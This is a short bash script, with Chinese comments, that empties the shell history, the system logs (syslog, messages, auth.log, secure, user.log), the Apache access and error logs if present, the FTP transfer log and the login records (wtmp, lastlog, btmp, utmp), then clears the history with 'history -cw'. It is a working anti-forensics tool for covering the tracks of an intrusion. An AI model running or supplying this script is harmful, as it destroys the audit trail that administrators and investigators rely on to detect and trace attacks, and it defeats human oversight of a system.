#!/bin/bash

cd ~
echo > ./.bash_history
echo > /var/log/syslog
echo > /var/log/messages

if [[ -f /var/log/httpd/access_log ]]; then
	# 文件存在
	echo > /var/log/httpd/access_log
fi

if [[ -f /var/log/httpd/error_log ]]; then
	# 文件存在
	echo > /var/log/httpd/error_log
fi

echo > /var/log/xferlog
echo > /var/log/secure
echo > /var/log/auth.log
echo > /var/log/user.log
echo > /var/log/wtmp
echo > /var/log/lastlog
echo > /var/log/btmp
echo > /var/run/utmp
history -cw